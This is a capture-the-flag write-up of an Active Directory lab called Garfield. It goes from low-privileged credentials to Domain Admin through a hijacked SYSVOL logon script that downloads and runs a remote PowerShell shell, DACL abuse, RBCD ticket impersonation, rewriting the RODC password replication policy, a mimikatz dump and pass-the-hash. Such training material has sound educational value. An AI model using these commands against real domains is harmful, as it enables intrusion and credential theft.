## Garfield

### Overview

**Garfield** is a hard-rated Windows Active Directory machine. We start with credentials for a low-privileged domain account, so there's no initial foothold to find, it's an assumed-breach setup.

With a writable `SYSVOL` share, we update the logon script and point a user's `scriptPath` attribute at it to land our first shell.

From there, a chain of weak object permissions lets us move from one account to the next until we land on an account with rights over the domain's **Read-Only Domain Controller (RODC)**. We use those rights to get a foothold on the RODC, then abuse the way an RODC caches domain passwords to recover the Administrator credentials and reach **Domain Admin**.

The lab touches on:

- Writable `SYSVOL` / `NETLOGON` logon scripts
- DACL abuse (`Script-Path`, force password reset)
- RODC administration and the Password Replication Policy (`PRP`)
- Resource-Based Constrained Delegation (`RBCD`)
- Pass-the-Hash

### Foothold — SYSVOL logon script

Spidering the shares turns up a `printerDetect.bat` script, present in both `NETLOGON` and `SYSVOL`:

```json
{
    "NETLOGON": {
        "printerDetect.bat": { "size": "217 B" }
    },
    "SYSVOL": {
        "garfield.htb/scripts/printerDetect.bat": { "size": "217 B" }
    }
}
```

Connecting to `SYSVOL`, we can read the script and, more importantly, we have **write** access to the directory (the `put test` / `rm test` round-trip confirms it):

```bash
mark@rwx:~/Desktop/Labs/HTB/Garfield$ smbclient.py j.arbuckle@DC01.garfield.htb

-rw-rw-rw-          2  Mon Nov  2 01:09:52 2026 test
```

A logon script only fires if a user's `scriptPath` attribute points at it. Our user belongs to the `IT SUPPORT` group, so I checked what DACL that group holds over user objects:

```bash
mark@rwx:~/Desktop/Labs/HTB/Garfield$ dacledit.py -action read -principal 'IT SUPPORT' -target l.wilson garfield.htb/j.arbuckle:'Th1sD4mnC4t!@1978' -dc-ip 10.129.81.27
[*]   ACE[24] info                
[*]     ACE Type                  : ACCESS_ALLOWED_OBJECT_ACE
[*]     Access mask               : ReadProperty, WriteProperty
[*]     Object type (GUID)        : Script-Path (bf9679a8-0de6-11d0-a285-00aa003049e2)
[*]     Inherited type (GUID)     : User (bf967aba-0de6-11d0-a285-00aa003049e2)
[*]     Trustee (SID)             : IT Support (S-1-5-21-2502726253-3859040611-225969357-3106)
```

`IT SUPPORT` has `WriteProperty` on the **Script-Path** attribute of user objects, which covers both:

```
l.wilson
l.wilson_adm
```

So the plan is: replace the logon script with a reverse-shell dropper, then point those users' `scriptPath` at it and wait for them to log on.

```bat
@echo off
echo Getting da shell!...

curl http://10.10.14.96/shell.ps1 -o c:\users\public\shell.ps1
powershell -ep bypass -w hidden -f c:\users\public\shell.ps1

echo.
echo Reverse shell completed.
pause
```

Upload it over `SYSVOL`, then set the `scriptPath` on both users with `bloodyAD`:

```bash
mark@rwx:~/Desktop/Labs/HTB/Garfield$ bloodyAD -H 10.129.81.27 -d garfield.htb -u j.arbuckle -p 'Th1sD4mnC4t!@1978' set object l.wilson scriptPath -v printerDetect.bat 
[+] l.wilson's scriptPath has been updated
mark@rwx:~/Desktop/Labs/HTB/Garfield$ bloodyAD -H 10.129.81.27 -d garfield.htb -u j.arbuckle -p 'Th1sD4mnC4t!@1978' set object l.wilson_adm scriptPath -v printerDetect.bat 
[+] l.wilson_adm's scriptPath has been updated
```

### l.wilson to l.wilson_adm

```bash

SHELL> $UserPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
SHELL> Set-DomainUserPassword -Identity l.wilson_adm -AccountPassword $UserPassword
```

### Reaching the RODC

`ipconfig /all` on `DC01` reveals a second, internal interface on `192.168.100.0/24`, a Hyper-V virtual switch, which is where the RODC lives:

```bash
evil-winrm-py PS C:\Users\l.wilson_adm\desktop> ipconfig /all

Ethernet adapter vEthernet (Switch01):
   Description . . . . . . . . . . . : Hyper-V Virtual Ethernet Adapter

   IPv4 Address. . . . . . . . . . . : 10.129.81.27(Preferred)
```

```bash
LDAP        10.129.81.27    389    DC01             RODC01$     Computer    Constrained w/ Protocol Transition                   
```

To reach the internal network directly, I pivoted through `DC01` with `ligolo`, after which `192.168.100.2` is reachable:

```bash
mark@rwx:~/Desktop/Labs/HTB/Garfield$ nxc-hosts 192.168.100.2
SMB         192.168.100.2   445    RODC01           [*] Windows 10 / Server 2019 Build 17763 x64 (name:RODC01) (domain:garfield.htb) (signing:True) (SMBv1:False) (Null Auth:True) (DC:True)
```

`l.wilson_adm` is a member of **Tier 1**, and Tier 1 members can add themselves to **RODC Administrators**:

```bash
evil-winrm-py PS C:\Users\l.wilson_adm\desktop> iex(new-object net.webclient).downloadstring('http://10.10.14.96/PowerView.ps1')
evil-winrm-py PS C:\Users\l.wilson_adm\desktop> Add-DomainGroupMember -Identity 'RODC ADMINISTRATORS' -Members 'l.wilson_adm'
evil-winrm-py PS C:\Users\l.wilson_adm\desktop> Get-DomainGroupMember -Identity 'RODC ADMINISTRATORS'

GroupName               : RODC Administrators
MemberName              : l.wilson_adm
MemberSID               : S-1-5-21-2502726253-3859040611-225969357-3107
```

Being in this group gives us write access over the `RODC01` computer object, which we use later to modify the Password Replication Policy (`PRP`).

> This attribute identifies the group that administers the RODC. Since RODCs are considered to be less trusted than Domain Controllers, they shouldn't be managed by Active Directory admins (DAs, etc). Often there's a RODC-specific admin group configured in this attribute, sometimes each RODC has a unique admin group.

### RBCD to compromise RODC01

Our write access over `RODC01` includes the **User-Account-Restrictions** property set, and that covers `msDS-AllowedToActOnBehalfOfOtherIdentity`. With write access to that attribute, we can perform **Resource-Based Constrained Delegation** against the RODC.

Add a computer account we control, configure RBCD from it to `RODC01$`, then request a ticket impersonating `Administrator` for the `cifs` service:

```bash
mark@rwx:~/Desktop/Labs/HTB/Garfield$ addcomputer.py -computer-name 'RWX$' -computer-pass RWX@123 -dc-ip 10.129.81.46 garfield.htb/l.wilson_adm:'Password123!'
[*] Successfully added machine account RWX$ with password RWX@123.
mark@rwx:~/Desktop/Labs/HTB/Garfield$ rbcd.py -delegate-from 'RWX$' -delegate-to 'RODC01$' -action 'write' 'garfield.htb/l.wilson_adm':'Password123!'
[*] Delegation rights modified successfully!
[*] RWX$ can now impersonate users on RODC01$ via S4U2Proxy
mark@rwx:~/Desktop/Labs/HTB/Garfield$ getST.py -spn cifs/RODC01.garfield.htb -impersonate Administrator -dc-ip 10.129.81.46 'garfield.htb/RWX$:RWX@123'
[*] Impersonating Administrator
[*] Requesting S4U2self
[*] Requesting S4U2Proxy
[*] Saving ticket in Administrator@cifs_RODC01.garfield.htb@GARFIELD.HTB.ccache
```

With that ticket we can dump secrets from `RODC01`:

```bash

mark@rwx:~/Desktop/Labs/HTB/Garfield$ secretsdump.py -k -no-pass -use-vss RODC01.garfield.htb
```

### RODC to Domain Admin (PRP abuse)

Full domain compromise still needs the real `Administrator` secret. The `msDS-RevealedUsers` attribute lists the accounts whose passwords are cached on the RODC, and our earlier dump shows `Administrator` is among them:

```
B:96:5A0009...:CN=Administrator,CN=Users,DC=garfield,DC=htb
```

The catch: although `Administrator` appears in `msDS-RevealedUsers`, the `msDS-NeverRevealGroup` list contains `CN=Administrators`. Since `Administrator` is a member of that group, the KDC refuses a `Kerb-Key-List` request with `KDC_ERR_TGT_REVOKED`.

Because `l.wilson_adm` is now in **RODC Administrators**, we can rewrite the Password Replication Policy. First, add `Administrator` to the reveal-on-demand group:

```bash
evil-winrm-py PS C:\Users\l.wilson_adm\Documents> Set-ADObject -Identity "CN=RODC01,OU=Domain Controllers,DC=garfield,DC=htb" -Add @{'msDS-RevealOnDemandGroup'='CN=Administrator,CN=Users,DC=garfield,DC=htb'}
```

Then clear the `NeverRevealGroup` entries that block it:

```bash
evil-winrm-py PS C:\Users\l.wilson_adm\Documents> Set-ADObject -Identity "CN=RODC01,OU=Domain Controllers,DC=garfield,DC=htb" -Clear "msDS-NeverRevealGroup"
```

Confirm the write landed:

```bash
mark@rwx:~/Desktop/Labs/HTB/Garfield$ nxc ldap DC01 -u l.wilson_adm -p 'Password123!' --query "(sAMAccountName=RODC01$)" "msDS-NeverRevealGroup msDS-RevealOnDemandGroup"
LDAP   ...   msDS-RevealOnDemandGroup CN=Allowed RODC Password Replication Group,CN=Users,DC=garfield,DC=htb
LDAP   ...                            CN=Administrator,CN=Users,DC=garfield,DC=htb
```

With the PRP now allowing it, force `DC01` to replicate `Administrator`'s secret down to the RODC's reveal cache using `repadmin /rodcpwdrepl`, executed on the RODC through our cached ticket:

```bash
mark@rwx:~/Desktop/Labs/HTB/Garfield$ export KRB5CCNAME=Administrator@cifs_RODC01.garfield.htb@GARFIELD.HTB.ccache
mark@rwx:~/Desktop/Labs/HTB/Garfield$ nxc smb 192.168.100.2 --use-kcache --exec-method smbexec -x 'repadmin /rodcpwdrepl RODC01 DC01 "CN=Administrator,CN=Users,DC=garfield,DC=htb"'
SMB    192.168.100.2   445   RODC01   [+] garfield.htb\Administrator from ccache (Pwn3d!)
SMB    192.168.100.2   445   RODC01   Successfully replicated secrets for user CN=Administrator,CN=Users,DC=garfield,DC=htb on read-only DC RODC01 from full DC DC01.
```

Now `Administrator` sits in the RODC reveal cache, so we dump it straight off `RODC01`:

```
mimikatz # privilege::debug
mimikatz # lsadump::lsa /inject /name:Administrator

RID  : 000001f4 (500)
User : Administrator

 * Primary
    NTLM : ee238f6debc752010428f20875b092d5
```

Finally, pass-the-hash as the domain `Administrator` against `DC01`:

```bash
mark@rwx:~/Desktop/Labs/HTB/Garfield$ nxc smb DC01 -u Administrator -H ee238f6debc752010428f20875b092d5
SMB    DC01   445   DC01   [+] garfield.htb\Administrator:ee238f6debc752010428f20875b092d5 (Pwn3d!)
```

```
Administrator:ee238f6debc752010428f20875b092d5
```

And that's **Domain Admin**.
